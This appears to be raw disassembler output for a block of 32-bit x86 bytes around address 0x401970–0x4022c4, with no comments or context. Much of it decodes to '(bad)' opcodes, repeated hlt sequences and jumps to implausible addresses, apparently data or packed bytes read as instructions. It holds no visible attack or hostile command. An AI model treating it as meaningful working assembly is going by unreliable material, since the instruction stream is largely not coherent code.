  40196c:	(bad)  [edx-0x5d0e0bfd]
  401972:	add    esi,esp
  401974:	add    DWORD PTR [ebx-0x4afb0bfd],esp
  40197a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40197b:	test   DWORD PTR [edx*4+0x7104f7a4],0x6b04f7a4
  401986:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401987:	test   DWORD PTR [ecx*2+0x1704f7a4],0x2104f7a4
  401992:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401993:	test   DWORD PTR [ecx+esi*8],0xd104f7a3
  40199a:	mov    ds:0xa3f504f7,eax
  40199f:	test   DWORD PTR [edi+ebp*8],0x9304f7a3
  4019a6:	(bad)  
  4019a7:	test   DWORD PTR [ecx*4-0x5efb0871],0x8f
	...
  4019c6:	add    BYTE PTR [eax],al
  4019c8:	test   DWORD PTR [ebx+eiz*4],0x3704f78f
  4019cf:	(bad)  
  4019d0:	test   DWORD PTR [ebx+ecx*4],0x7b04f78f
  4019d7:	(bad)  
  4019d8:	test   DWORD PTR [edi+edx*8],0xd704f78e
  4019df:	mov    ?,edi
  4019e1:	add    al,0xcb
  4019e3:	mov    ?,edi
  4019e5:	add    al,0xad
  4019e7:	mov    ?,edi
  4019e9:	add    al,0xf5
  4019eb:	mov    ?,edi
  4019ed:	add    al,0x3
  4019ef:	(bad)  
  4019f0:	test   DWORD PTR [ebx+eax*1],0xf304f78f
  4019f7:	mov    ?,edi
  4019f9:	add    al,0x13
  4019fb:	mov    ?,edi
  4019fd:	add    al,0xd1
  4019ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a00:	test   DWORD PTR [edi+edx*1],0x2704f78e
  401a07:	mov    ?,edi
  401a09:	add    al,0x0
  401a0b:	cmp    eax,0x4b000672
  401a10:	push   0x6
  401a12:	add    BYTE PTR [ebx-0x7f],bh
  401a15:	push   es
  401a16:	add    BYTE PTR [ebx+0x79],ch
  401a19:	push   es
  401a1a:	add    BYTE PTR [edi+0x72],bl
  401a1d:	push   es
  401a1e:	add    BYTE PTR [edi],dh
  401a20:	push   0x6
  401a22:	add    BYTE PTR ds:0xf5000682,ch
  401a28:	jns    0x401a30
  401a2a:	add    BYTE PTR [ecx],al
	...
  401a44:	add    BYTE PTR [edx+0x6],dh
  401a47:	add    ch,dl
  401a49:	imul   eax,DWORD PTR [esi],0x681ef00
  401a4f:	add    BYTE PTR [ecx-0x7efff99c],ah
  401a55:	fs push es
  401a57:	add    BYTE PTR [ebp-0x66fff99c],ch
  401a5d:	test   BYTE PTR [esi],al
  401a5f:	add    BYTE PTR [ecx-0x7c],al
  401a62:	push   es
  401a63:	add    BYTE PTR [ebp-0x7c],al
  401a66:	push   es
  401a67:	add    BYTE PTR [edi-0x7c],dl
  401a6a:	push   es
  401a6b:	add    bl,ah
  401a6d:	fs push es
  401a6f:	add    bl,cl
  401a71:	fs push es
  401a73:	add    BYTE PTR [edi-0x5cfff99c],bh
  401a79:	fs push es
  401a7b:	add    ch,bh
  401a7d:	test   BYTE PTR [esi],al
  401a7f:	add    BYTE PTR [ebx],cl
  401a81:	test   DWORD PTR [esi],eax
  401a83:	add    bh,ah
  401a85:	test   BYTE PTR [esi],al
  401a87:	add    BYTE PTR [ecx],bh
  401a89:	imul   eax,DWORD PTR [esi],0x0
  401a8c:	or     DWORD PTR [ebx+0x7b330006],eax
  401a92:	push   es
  401a93:	add    BYTE PTR [ecx+0x73],dl
  401a96:	push   es
  401a97:	add    BYTE PTR [ebx+0x6b],al
  401a9a:	push   es
  401a9b:	add    BYTE PTR [eax],al
  401a9d:	push   edi
  401a9e:	jp     0x401aa3
  401aa0:	add    BYTE PTR [edi+0x7a],ah
  401aa3:	add    eax,DWORD PTR [eax]
  401aa5:	mov    eax,ds:0x379
	...
  401ac2:	dec    ecx
  401ac3:	jp     0x401ac8
  401ac5:	add    BYTE PTR [ecx],ch
  401ac7:	xchg   ebp,eax
  401ac8:	add    eax,DWORD PTR [eax]
  401aca:	add    edx,DWORD PTR [ebp-0x6aecfffd]
  401ad0:	add    eax,DWORD PTR [eax]
  401ad2:	adc    DWORD PTR [ebp+0x59d0003],ebx
  401ad8:	add    BYTE PTR [eax],al
  401ada:	scas   eax,DWORD PTR es:[edi]
  401adb:	mov    al,0x3
  401add:	add    bl,cl
  401adf:	mov    al,0x3
  401ae1:	add    BYTE PTR [ecx-0x62fffc50],bh
  401ae7:	add    eax,0x5930000
  401aec:	add    BYTE PTR [eax-0x7ffffa6b],al
  401af2:	pop    DWORD PTR ds:0x5648000
  401af8:	add    BYTE PTR [eax+0x55d],al
  401afe:	mov    edi,0x490003b5
  401b03:	mov    dh,0x3
  401b05:	add    BYTE PTR ds:0x5d0003b6,ah
  401b0b:	add    eax,0xb6930000
  401b10:	add    eax,DWORD PTR [eax]
  401b12:	jecxz  0x401ac9
  401b14:	add    eax,DWORD PTR [eax]
  401b16:	sub    eax,DWORD PTR ds:0xb5f98000
  401b1c:	add    eax,DWORD PTR [eax]
  401b1e:	out    dx,eax
  401b1f:	mov    ch,0x3
  401b21:	add    BYTE PTR [ebx-0x4a],al
  401b24:	add    eax,DWORD PTR [eax]
	...
  401b3e:	add    BYTE PTR [edi],al
  401b40:	mov    dh,0x3
  401b42:	add    bl,ah
  401b44:	mov    al,0x3
  401b46:	add    ah,dh
  401b48:	std    
  401b49:	mov    bl,0x3
  401b4b:	hlt    
  401b4c:	das    
  401b4d:	mov    ah,0x3
  401b4f:	hlt    
  401b50:	pop    ss
  401b51:	mov    ah,0x3
  401b53:	hlt    
  401b54:	inc    ebp
  401b55:	mov    ah,0x3
  401b57:	hlt    
  401b58:	inc    ecx
  401b59:	mov    ah,0x3
  401b5b:	hlt    
  401b5c:	push   ebp
  401b5d:	mov    ah,0x3
  401b5f:	hlt    
  401b60:	pop    ebx
  401b61:	mov    bl,0x3
  401b63:	hlt    
  401b64:	dec    ebp
  401b65:	mov    ah,0x3
  401b67:	hlt    
  401b68:	cmp    eax,0x7f403b4
  401b6d:	mov    ah,0x3
  401b6f:	hlt    
  401b70:	out    0xb3,eax
  401b72:	add    esi,esp
  401b74:	sti    
  401b75:	mov    bl,0x3
  401b77:	hlt    
  401b78:	(bad)  
  401b79:	mov    bl,0x3
  401b7b:	hlt    
  401b7c:	fbstp  TBYTE PTR [ebx-0x63740bfd]
  401b82:	add    esi,esp
  401b84:	jg     0x401b22
  401b86:	add    esi,esp
  401b88:	mov    bl,0x9c
  401b8a:	add    esi,esp
  401b8c:	mov    eax,ds:0x4ff4039c
  401b91:	pushf  
  401b92:	add    esi,esp
  401b94:	fld    QWORD PTR [ebx]
  401b96:	add    ah,dh
  401b98:	aas    
  401b99:	mov    dl,0x3
  401b9b:	hlt    
  401b9c:	fld    QWORD PTR [ebx]
  401b9e:	add    ah,dh
  401ba0:	mov    ecx,0x39a
	...
  401bb9:	add    BYTE PTR [eax],al
  401bbb:	add    ah,dh
  401bbd:	scas   eax,DWORD PTR es:[edi]
  401bbe:	call   0xf403:0x9a97f403
  401bc5:	adc    eax,0x13f4039b
  401bca:	fwait
  401bcb:	add    esi,esp
  401bcd:	jecxz  0x401b69
  401bcf:	add    esi,esp
  401bd1:	fistp  WORD PTR [edx-0x64e80bfd]
  401bd7:	add    esi,esp
  401bd9:	add    al,0x17
  401bdb:	fwait
  401bdc:	test   DWORD PTR [ecx+ecx*1],0x3904f79b
  401be3:	fwait
  401be4:	test   DWORD PTR [edi+esi*2],0x5304f79a
  401beb:	call   0x4f7:0x9a3d04f7
  401bf2:	and    ebx,DWORD PTR [edx-0x65e8fb09]
  401bf8:	test   DWORD PTR [edx*8-0x28fb0863],0xef04f79d
  401c03:	popf   
  401c04:	test   DWORD PTR [edi+esi*8],0xd04f79d
  401c0b:	sahf   
  401c0c:	test   DWORD PTR [ecx+edi*8],0xf504f79d
  401c13:	popf   
  401c14:	test   DWORD PTR [edi+esi*1],0x4304f79d
  401c1b:	sahf   
  401c1c:	test   DWORD PTR [edi+eax*1],0x9e
	...
  401c37:	add    BYTE PTR [eax],al
  401c39:	test   DWORD PTR [ebx*1+0x6504f79e],0x5b04f79e
  401c44:	sahf   
  401c45:	test   DWORD PTR [edi+ebx*2],0x3904f79e
  401c4c:	sahf   
  401c4d:	test   DWORD PTR [ecx+ebp*4],0x3b04f79e
  401c54:	sahf   
  401c55:	test   DWORD PTR [eax*2+0x5f04f79e],0xe304f79e
  401c60:	sahf   
  401c61:	test   DWORD PTR [ecx+eiz*8],0x6104f79e
  401c68:	cwde   
  401c69:	test   DWORD PTR [eax+eax*1],0x37c61
  401c70:	mov    ch,0x6b
  401c72:	add    eax,DWORD PTR [eax]
  401c74:	(bad)  
  401c75:	arpl   WORD PTR [ebx],ax
  401c77:	add    BYTE PTR [ebx-0x5efffc95],bh
  401c7d:	arpl   WORD PTR [ebx],ax
  401c7f:	add    bh,dl
  401c81:	mov    eax,DWORD PTR [edx]
  401c83:	add    bl,cl
  401c85:	add    DWORD PTR [edx],0x0
  401c88:	repz mov eax,DWORD PTR [edx]
  401c8b:	add    BYTE PTR [ebx+0x6b000279],ah
  401c91:	jno    0x401c95
  401c93:	add    bl,ah
  401c95:	push   0x2
  401c97:	add    bl,dl
  401c99:	bound  eax,QWORD PTR [edx]
  401c9b:	add    BYTE PTR [edi+0x0],bh
	...
  401cb5:	add    BYTE PTR [edx+0x2],bl
  401cb8:	add    BYTE PTR [ebp-0x3cfffd6e],ah
  401cbe:	push   esp
  401cbf:	add    al,BYTE PTR [eax]
  401cc1:	out    dx,eax
  401cc2:	push   ebp
  401cc3:	add    al,BYTE PTR [eax]
  401cc5:	xlat   BYTE PTR ds:[ebx]
  401cc6:	push   ebp
  401cc7:	add    al,BYTE PTR [eax]
  401cc9:	sti    
  401cca:	push   ebp
  401ccb:	add    al,BYTE PTR [eax]
  401ccd:	aaa    
  401cce:	push   esi
  401ccf:	add    al,BYTE PTR [eax]
  401cd1:	or     edx,DWORD PTR [esi+0x2]
  401cd4:	add    BYTE PTR [edi],bl
  401cd6:	push   esi
  401cd7:	add    al,BYTE PTR [eax]
  401cd9:	gs xchg ebp,eax
  401cdb:	add    al,BYTE PTR [eax]
  401cdd:	pop    ebx
  401cde:	xchg   ebp,eax
  401cdf:	add    al,BYTE PTR [eax]
  401ce1:	dec    ecx
  401ce2:	xchg   ebp,eax
  401ce3:	add    al,BYTE PTR [eax]
  401ce5:	stos   DWORD PTR es:[edi],eax
  401ce6:	jg     0x401cea
  401ce8:	add    BYTE PTR [ebx],bh
  401cea:	outs   dx,DWORD PTR ds:[esi]
  401ceb:	add    al,BYTE PTR [eax]
  401ced:	mov    ebp,DWORD PTR [edi+0x2]
  401cf0:	add    BYTE PTR [ebx+0x5f],bh
  401cf3:	add    al,BYTE PTR [eax]
  401cf5:	outs   dx,DWORD PTR ds:[esi]
  401cf6:	pop    edi
  401cf7:	add    al,BYTE PTR [eax]
  401cf9:	aad    0x8f
  401cfb:	add    al,BYTE PTR [eax]
  401cfd:	add    BYTE PTR [ecx],bh
  401cff:	mov    al,BYTE PTR [ebx]
  401d01:	add    BYTE PTR [edi-0x76],bh
  401d04:	add    eax,DWORD PTR [eax]
  401d06:	dec    edi
  401d07:	mov    al,BYTE PTR [ebx]
  401d09:	add    bl,bh
  401d0b:	mov    BYTE PTR [ebx],al
  401d0d:	add    ch,dh
  401d0f:	mov    BYTE PTR [ebx],al
  401d11:	add    BYTE PTR ds:0xe700038a,al
  401d17:	mov    ds:0x3,al
	...
  401d30:	add    BYTE PTR [eax],al
  401d32:	add    ch,dh
  401d34:	mov    ds:0xa2fd0003,al
  401d39:	add    eax,DWORD PTR [eax]
  401d3b:	adc    esp,DWORD PTR [ebx-0x5cf0fffd]
  401d41:	add    eax,DWORD PTR [eax]
  401d43:	or     eax,0x8f0003a3
  401d48:	mov    ds:0xa2bb0003,al
  401d4d:	add    eax,DWORD PTR [eax]
  401d4f:	xchg   DWORD PTR [bp+di],eax
  401d52:	add    BYTE PTR [ebp-0x79],dh
  401d55:	add    eax,DWORD PTR [eax]
  401d57:	dec    ecx
  401d58:	mov    BYTE PTR [ebx],al
  401d5a:	add    BYTE PTR [ebx],bl
  401d5c:	mov    BYTE PTR [ebx],al
  401d5e:	add    bl,bl
  401d60:	xchg   DWORD PTR [ebx],eax
  401d62:	add    BYTE PTR [edi],bh
  401d64:	mov    BYTE PTR [ebx],al
  401d66:	add    bl,al
  401d68:	xchg   DWORD PTR [ebx],eax
  401d6a:	add    BYTE PTR [ecx-0x4afffc78],ah
  401d70:	mov    BYTE PTR [ebx],al
  401d72:	add    BYTE PTR [ebx+0x5b0003a2],cl
  401d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d79:	add    eax,DWORD PTR [eax]
  401d7b:	sub    eax,0xa50003a4
  401d80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d81:	add    eax,DWORD PTR [eax]
  401d83:	repz mov ds:0xa43f0003,eax
  401d89:	add    eax,DWORD PTR [eax]
  401d8b:	and    DWORD PTR [ebx+eax*1-0x5ea20c00],esp
  401d92:	add    esi,esp
  401d94:	jno    0x401d37
  401d96:	add    eax,DWORD PTR [eax]
	...
  401db0:	hlt    
  401db1:	mov    gs:0x3dbf403,al
  401db7:	add    ah,dh
  401db9:	lss    eax,FWORD PTR [ebx]
  401dbc:	hlt    
  401dbd:	pop    ds
  401dbe:	mov    dl,0x3
  401dc0:	hlt    
  401dc1:	dec    edi
  401dc2:	mov    dl,0x3
  401dc4:	hlt    
  401dc5:	imul   esi,DWORD PTR [edx-0x4e780bfd],0xb1b1f403
  401dcf:	add    esi,esp
  401dd1:	xchg   ebp,eax
  401dd2:	mov    cl,0x3
  401dd4:	hlt    
  401dd5:	lahf   
  401dd6:	mov    cl,0x3
  401dd8:	hlt    
  401dd9:	mov    ebx,0xe5f403b1
  401dde:	mov    cl,0x3
  401de0:	hlt    
  401de1:	mov    bh,0xae
  401de3:	add    esi,esp
  401de5:	mov    cl,0xae
  401de7:	add    esi,esp
  401de9:	sub    DWORD PTR [esi-0x51720bfd],0x3
  401df0:	hlt    
  401df1:	push   edi
  401df2:	scas   al,BYTE PTR es:[edi]
  401df3:	add    esi,esp
  401df5:	inc    edi
  401df6:	scas   eax,DWORD PTR es:[edi]
  401df7:	add    esi,esp
  401df9:	push   ebx
  401dfa:	scas   eax,DWORD PTR es:[edi]
  401dfb:	add    esi,esp
  401dfd:	add    DWORD PTR [edi-0x511a0bfd],ebp
  401e03:	add    esi,esp
  401e05:	sub    DWORD PTR [edi-0x51200bfd],0x3
  401e0c:	hlt    
  401e0d:	leave  
  401e0e:	scas   al,BYTE PTR es:[edi]
  401e0f:	add    esi,esp
  401e11:	in     eax,dx
  401e12:	add    eax,DWORD PTR [eax]
	...
  401e2c:	add    ah,dh
  401e2e:	adc    al,BYTE PTR [eax+eax*1]
  401e31:	je     0x401df3
  401e33:	add    eax,DWORD PTR [eax]
  401e35:	je     0x401ea3
  401e37:	mov    ah,0x3
  401e39:	hlt    
  401e3a:	add    al,0xda
  401e3c:	add    esi,esp
  401e3e:	test   ch,ah
  401e40:	add    esi,esp
  401e42:	test   ch,bh
  401e44:	add    esi,esp
  401e46:	test   bh,ah
  401e48:	add    esi,esp
  401e4a:	test   al,bl
  401e4c:	add    esi,esp
  401e4e:	test   ah,ah
  401e50:	add    esi,esp
  401e52:	test   ch,ah
  401e54:	scas   eax,DWORD PTR es:[edi]
  401e55:	test   DWORD PTR [ebx+ebp*8],0x1b04f7af
  401e5c:	mov    ah,0xf7
  401e5e:	add    al,0x7
  401e60:	mov    ah,0xf7
  401e62:	add    al,0x27
  401e64:	mov    ah,0xf7
  401e66:	add    al,0x4d
  401e68:	mov    ah,0xf7
  401e6a:	add    al,0xdc
  401e6c:	add    esi,esp
  401e6e:	test   BYTE PTR [ebx-0x4c],dl
  401e71:	test   DWORD PTR [esi+ebp*8],0x5584f403
  401e78:	mov    ah,0xf7
  401e7a:	add    al,0xff
  401e7c:	add    esi,esp
  401e7e:	test   BYTE PTR [ebp+0x4],dl
  401e81:	hlt    
  401e82:	test   cl,bh
  401e84:	add    esi,esp
  401e86:	test   bl,ch
  401e88:	add    esi,esp
  401e8a:	test   dh,bl
  401e8c:	add    esi,esp
  401e8e:	test   BYTE PTR [edi],dh
  401e90:	mov    bl,0x0
	...
  401eaa:	test   DWORD PTR [ecx+edi*1],0xea84f404
  401eb1:	add    esi,esp
  401eb3:	test   dl,bh
  401eb5:	add    esi,esp
  401eb7:	test   ah,ch
  401eb9:	add    esi,esp
  401ebb:	test   al,ch
  401ebd:	add    esi,esp
  401ebf:	test   cl,ch
  401ec1:	add    esi,esp
  401ec3:	add    al,0xfd
  401ec5:	scas   al,BYTE PTR es:[edi]
  401ec6:	test   DWORD PTR [edi+edi*8],0x4f7ae
  401ecd:	popa   
  401ece:	mov    ds:0x9b5b0007,eax
  401ed3:	pop    es
  401ed4:	add    BYTE PTR [edi-0x6efff86d],al
  401eda:	mov    eax,DWORD PTR [edi]
  401edc:	add    BYTE PTR [ebx-0x72fff89d],bl
  401ee2:	pop    ebx
  401ee3:	pop    es
  401ee4:	add    BYTE PTR [edi],ch
  401ee6:	push   ebx
  401ee7:	pop    es
  401ee8:	add    BYTE PTR [ecx],bl
  401eea:	dec    ebx
  401eeb:	pop    es
  401eec:	add    BYTE PTR [edi],bl
  401eee:	arpl   WORD PTR [edi],ax
  401ef0:	add    BYTE PTR [ecx+0x5b],cl
  401ef3:	pop    es
  401ef4:	add    BYTE PTR [edi],dl
  401ef6:	push   ebx
  401ef7:	pop    es
  401ef8:	add    BYTE PTR ds:0x7b00074b,bl
  401efe:	mov    al,ds:0xf7e90006
  401f03:	add    al,0x0
  401f05:	xchg   ecx,eax
  401f06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f07:	push   es
  401f08:	add    BYTE PTR [edi-0x48fff95b],dl
	...
  401f26:	add    BYTE PTR [ebp-0x7a42fffa],al
  401f2c:	push   es
  401f2d:	add    BYTE PTR [ecx],al
  401f2f:	xchg   BYTE PTR [esi],al
  401f31:	add    cl,dh
  401f33:	test   DWORD PTR [esi],eax
  401f35:	add    bh,bl
  401f37:	push   0x60c50006
  401f3c:	push   es
  401f3d:	add    BYTE PTR [ebp-0x16fff998],dh
  401f43:	test   DWORD PTR [eax+eax*1],0x3e9b7492
  401f4a:	mov    al,0x14
  401f4c:	fisttp DWORD PTR [ecx+ecx*2-0x33]
  401f50:	in     eax,0xef
  401f52:	add    al,0x6
  401f54:	cmp    BYTE PTR ds:0xa525984d,0x69
  401f5b:	cli    
  401f5c:	fimul  DWORD PTR [edi+0x0]
  401f5f:	mov    eax,0xe73160d
  401f64:	les    ebp,FWORD PTR [edi-0x3ee7adea]
  401f6a:	sbb    dh,BYTE PTR [edx+0x4]
  401f6d:	pop    ebp
  401f6e:	dec    esi
  401f6f:	bound  esp,QWORD PTR [edx]
  401f71:	cs mov cl,0x6b
  401f74:	cmp    DWORD PTR [eax-0x740dde49],ebx
  401f7a:	repz pop esi
  401f7c:	or     eax,0x4be42f2
  401f81:	fisub  WORD PTR ds:0xfbfe
  401f86:	and    ebx,DWORD PTR [edx+0x5e6c84]
	...
  401fa4:	(bad)  
  401fa5:	ficomp DWORD PTR [edi+0x47]
  401fa8:	ja     0x401f92
  401faa:	jmp    0x5c73:0x71b00233
  401fb1:	stos   DWORD PTR es:[edi],eax
  401fb2:	xor    ebp,DWORD PTR [ecx]
  401fb4:	ret    
  401fb5:	outs   dx,BYTE PTR ds:[esi]
  401fb6:	rcl    BYTE PTR [ecx],cl
  401fb8:	pop    ds
  401fb9:	fdivr  st,st(7)
  401fbb:	mov    edi,0x603e8d8a
  401fc0:	xor    BYTE PTR [ebx+0x6e832933],ch
  401fc6:	rcl    BYTE PTR [ecx],cl
  401fc8:	pop    edi
  401fc9:	(bad)  
  401fcb:	mov    edi,0x603e910a
  401fd0:	addps  xmm0,XMMWORD PTR [edi]
  401fd3:	cmc    
  401fd4:	in     al,dx
  401fd5:	mov    eax,ds:0xae2411d3
  401fda:	add    BYTE PTR [eax],al
  401fdc:	mov    ch,0x7
  401fde:	loop   0x402001
  401fe0:	jge    0x40200d
  401fe2:	dec    eax
  401fe3:	loopne 0x40203f
  401fe5:	pop    ds
  401fe6:	pushf  
  401fe7:	dec    ebp
  401fe8:	xor    edx,ebx
  401fea:	ja     0x40202d
  401fec:	cmp    eax,0xf4f79595
  401ff1:	cmp    BYTE PTR [edx-0x77],0x63
  401ff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ff6:	mov    edx,0xd84dba32
  401ffb:	(bad)  
  401ffd:	mov    BYTE PTR [ebx],dl
  401fff:	sbb    al,BYTE PTR [esi-0x4f]
  402002:	aas    
  402003:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402004:	clc    
  402005:	and    BYTE PTR ds:0x6c,ch
	...
  40201f:	add    BYTE PTR [eax],al
  402021:	scas   al,BYTE PTR es:[edi]
  402022:	stos   BYTE PTR es:[edi],al
  402023:	xchg   edx,eax
  402024:	lahf   
  402025:	ret    0xfddb
  402028:	jge    0x402053
  40202a:	lods   eax,DWORD PTR ds:[esi]
  40202b:	fimul  DWORD PTR [esp+eiz*8-0xc]
  40202f:	push   ebp
  402030:	fdiv   DWORD PTR [edi+edi*1+0x2807b92a]
  402037:	clc    
  402038:	fwait
  402039:	sub    BYTE PTR [ebx],dh
  40203b:	daa    
  40203c:	push   ebp
  40203d:	pop    ecx
  40203e:	pop    esp
  40203f:	(bad)  
  402040:	dec    edx
  402041:	mov    ebx,0xe8fc0d59
  402046:	retf   
  402047:	outs   dx,BYTE PTR ds:[esi]
  402048:	mov    bh,0x2c
  40204a:	sbb    DWORD PTR ds:0x485164dd,ebx
  402050:	call   0x2434688f
  402055:	mov    ds:0x83283e1b,al
  40205a:	inc    ebx
  40205b:	mov    esp,0x95664565
  402060:	mov    ebp,0x53e67036
  402065:	in     al,0x79
  402067:	sbb    ebx,DWORD PTR [edx-0xa]
  40206a:	mov    bh,0x8d
  40206c:	shr    DWORD PTR [edx],0xe9
  40206f:	jae    0x402042
  402071:	add    eax,0xb4009379
  402076:	das    
  402077:	int3   
  402078:	std    
  402079:	xchg   ebx,eax
  40207a:	ins    DWORD PTR es:[edi],dx
  40207b:	popf   
  40207c:	adc    ch,BYTE PTR [eax-0x1a308ed1]
  402082:	add    al,0x71
  402084:	add    BYTE PTR ss:[eax],al
	...
  40209b:	add    BYTE PTR [eax],al
  40209d:	add    ah,dh
  40209f:	stos   BYTE PTR es:[edi],al
  4020a0:	jmp    0x736942dd
  4020a5:	daa    
  4020a6:	and    DWORD PTR [esi+0x2],ecx
  4020a9:	push   ebx
  4020aa:	inc    ebp
  4020ab:	not    BYTE PTR [esi-0x63]
  4020ae:	hlt    
  4020af:	les    ebp,FWORD PTR [esi]
  4020b1:	scas   al,BYTE PTR es:[edi]
  4020b2:	jl     0x4020d9
  4020b4:	imul   ebx,DWORD PTR [ebp+0x70eec0e6],0x3670f633
  4020be:	hlt    
  4020bf:	stos   BYTE PTR es:[edi],al
  4020c0:	jmp    0x706902fd
  4020c5:	mov    edx,0x33815d79
  4020cb:	test   BYTE PTR [ecx-0x16550b9b],0x31
  4020d2:	mov    ah,0xc7
  4020d4:	outs   dx,BYTE PTR ds:[esi]
  4020d5:	popf   
  4020d6:	out    0xc0,al
  4020d8:	scas   al,BYTE PTR es:[edi]
  4020d9:	jo     0x40210e
  4020db:	div    BYTE PTR [eax+0x36]
  4020de:	hlt    
  4020df:	stos   BYTE PTR es:[edi],al
  4020e0:	jmp    0xe869431d
  4020e5:	imul   esi,DWORD PTR [ecx+0x60],0x68
  4020e9:	jo     0x40209e
  4020eb:	cmc    
  4020ec:	jo     0x402124
  4020ee:	hlt    
  4020ef:	stos   BYTE PTR es:[edi],al
  4020f0:	jmp    0x869432d
  4020f5:	cmp    al,0x4d
  4020f7:	add    edi,DWORD PTR [eax-0x760a4d34]
  4020fd:	cmp    esi,esp
  4020ff:	add    al,0xe9
  402101:	add    eax,DWORD PTR [eax]
	...
  40211b:	hlt    
  40211c:	add    eax,0x4858aa5c
  402121:	int    0xec
  402123:	(bad)  
  402124:	cmc    
  402125:	mov    BYTE PTR [eax-0xc],ah
  402128:	les    ebp,FWORD PTR [esi]
  40212a:	call   0xb05e:0x3d00247c
  402131:	inc    esp
  402132:	lods   eax,DWORD PTR ds:[esi]
  402133:	nop
  402134:	mov    ah,0x11
  402136:	dec    ecx
  402137:	adc    al,0x5
  402139:	shr    BYTE PTR [esi],0x8e
  40213c:	mov    WORD PTR [eax],fs
  40213e:	gs mov bl,dl
  402141:	sbb    al,0xca
  402143:	pop    esp
  402144:	mov    ah,0x11
  402146:	push   esp
  402147:	mov    ecx,0x902ec004
  40214c:	loope  0x40214d
  40214e:	in     eax,dx
  40214f:	je     0x4021a4
  402151:	xor    eax,edi
  402153:	jmp    0x40212d
  402155:	dec    esp
  402156:	adc    esp,0x37
  402159:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40215a:	mov    bl,0x1e
  40215c:	std    
  40215d:	push   ebp
  40215e:	xchg   ebp,eax
  40215f:	adc    DWORD PTR [edi-0x4cf5e515],eax
  402165:	adc    DWORD PTR [edi-0x513ffbd7],edx
  40216b:	ins    DWORD PTR es:[edi],dx
  40216c:	mov    WORD PTR [eax],fs
  40216e:	cs loop 0x4021ef
  402171:	les    esp,FWORD PTR [edx+0x54]
  402174:	mov    dl,0x11
  402176:	ins    BYTE PTR es:[edi],dx
  402177:	cmp    al,0x4
  402179:	adc    bl,al
  40217b:	test   BYTE PTR [ecx+0x2c04],0x0
	...
  402196:	add    BYTE PTR [eax],al
  402198:	mov    dh,0x3c
  40219a:	mov    ds:0x4819cffa,eax
  40219f:	jae    0x4021ab
  4021a1:	fwait
  4021a2:	jg     0x402180
  4021a4:	cs pusha 
  4021a6:	jbe    0x4021f8
  4021a8:	adc    al,0x18
  4021aa:	dec    ecx
  4021ab:	or     BYTE PTR [eax],0xb4
  4021ae:	adc    DWORD PTR [edi+0x2ec0058d],edx
  4021b4:	mov    cs,WORD PTR [ebp+0x8b16120]
  4021ba:	daa    
  4021bb:	jg     0x4021fd
  4021bd:	mov    bl,0x11
  4021bf:	add    BYTE PTR [esi],bl
  4021c1:	dec    edx
  4021c2:	add    BYTE PTR [eax],dl
  4021c4:	xlat   BYTE PTR ds:[ebx]
  4021c5:	add    DWORD PTR [ecx+0x34fe2f77],eax
  4021cb:	dec    ecx
  4021cc:	ss sbb cl,dl
  4021cf:	adc    DWORD PTR [ebx],esp
  4021d1:	lods   al,BYTE PTR ds:[esi]
  4021d2:	add    al,al
  4021d4:	and    bh,BYTE PTR [ebx-0x78]
  4021d7:	and    BYTE PTR [edx+edi*4-0x70],ch
  4021db:	inc    ebp
  4021dc:	inc    edi
  4021dd:	add    eax,0x2e411d0
  4021e2:	add    BYTE PTR [edx+0x242e4f5d],ch
  4021e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021e9:	imul   ecx,DWORD PTR [ebx+0x67],0xffffff9f
  4021ed:	rcl    eax,cl
  4021ef:	adc    DWORD PTR [eax+0x39],esp
  4021f2:	add    al,al
  4021f4:	bound  ebx,QWORD PTR [edx+0x28f5fffd]
  4021fa:	mov    ebp,0x49
	...
  402213:	add    BYTE PTR [eax],al
  402215:	out    dx,al
  402216:	fcmovnbe st,st(0)
  402218:	adc    DWORD PTR [eax+0x62c00041],eax
  40221e:	call   0x9a64:0xf19bfffd
  402225:	(bad)  
  402226:	fcmovnbe st,st(1)
  402228:	adc    DWORD PTR [eax-0x59efff40],ebx
  40222e:	xor    DWORD PTR [esi],edi
  402230:	std    
  402231:	stos   BYTE PTR es:[edi],al
  402232:	pop    edx
  402233:	scas   eax,DWORD PTR es:[edi]
  402234:	ins    DWORD PTR es:[edi],dx
  402235:	retf   0xd213
  402238:	adc    DWORD PTR [ebx-0x2f],eax
  40223b:	add    al,al
  40223d:	mov    ds:0x20887b,al
  402242:	jmp    0xf7bf0dce
  402247:	rcl    DWORD PTR [ecx],1
  402249:	arpl   cx,cx
  40224b:	add    al,al
  40224d:	loop   0x4022c9
  40224f:	mov    BYTE PTR [eax],ah
  402251:	hlt    
  402252:	lods   eax,DWORD PTR ds:[esi]
  402253:	push   ss
  402254:	sahf   
  402255:	mov    eax,0x5d2a062
  40225a:	jno    0x402214
  40225c:	add    ah,ah
  40225e:	and    DWORD PTR [ecx],eax
  402260:	xor    eax,0xffffff99
  402263:	push   0x15
  402265:	mov    ebx,0xe5d139cd
  40226a:	cmp    BYTE PTR [ecx-0x43d1cc00],cl
  402270:	std    
  402271:	imul   ebx,DWORD PTR [eax+0x37],0x1c
  402275:	jno    0x4022f2
  402277:	mov    BYTE PTR [ebx+0x0],dh
	...
  402291:	add    BYTE PTR [edi-0x64a948b2],ch
  402297:	sub    bh,BYTE PTR [esi]
  402299:	fwait
  40229a:	xchg   edx,eax
  40229b:	push   esp
  40229c:	push   DWORD PTR [edx-0x2c494775]
  4022a2:	in     eax,0x8c
  4022a4:	add    BYTE PTR [eax],al
  4022a6:	add    al,0xc2
  4022a8:	add    BYTE PTR [ecx-0x32],dl
  4022ab:	icebp  
  4022ac:	mov    edi,DWORD PTR [edi-0x2c31e99d]
  4022b2:	add    eax,0x3fffd8d
  4022b7:	mov    ds:0xa5ae5100,al
  4022bc:	js     0x40226d
  4022be:	xchg   ecx,eax
  4022bf:	(bad)  
  4022c0:	xor    edx,edx
  4022c2:	in     eax,0x35
  4022c4:	retf   
